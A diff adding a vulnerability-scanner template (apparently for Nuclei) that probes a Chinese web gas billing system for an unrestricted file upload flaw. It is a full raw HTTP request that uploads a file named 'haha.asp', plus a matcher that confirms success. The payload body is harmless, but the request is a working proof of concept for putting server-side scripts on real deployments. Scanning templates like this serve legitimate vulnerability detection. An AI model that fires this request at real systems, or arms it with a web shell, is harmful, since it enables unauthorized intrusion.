@@ -1,0 +1,44 @@
+id: xianfengkongre-AjaxService-Upload
+info:
+  name: xianfengkongre-AjaxService-Upload
+  author: apple
+  severity: critical
+  description: 先锋WEB燃气收费系统存在文件上传漏洞
+  reference:
+    - https://mp.weixin.qq.com/s/dBkqbSbFb4MYqUVdOgVqXQ
+  tags: tags
+http:
+  - raw:
+      - |
+        POST /AjaxService/Upload.aspx HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Content-Type: multipart/form-data; boundary=---------------------------79842940319434727123999669503
+        Content-Length: 353
+        Origin: null
+        Upgrade-Insecure-Requests: 1
+        Sec-Fetch-Dest: document
+        Sec-Fetch-Mode: navigate
+        Sec-Fetch-Site: cross-site
+        Sec-Fetch-User: ?1
+        Te: trailers
+        Connection: close
+
+        -----------------------------79842940319434727123999669503
+        Content-Disposition: form-data; name="Fdata"; filename="haha.asp"
+        Content-Type: application/octet-stream
+
+        123
+        -----------------------------79842940319434727123999669503
+        Content-Disposition: form-data; name="submit"
+
+        Submin
+        -----------------------------79842940319434727123999669503--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '.asp'
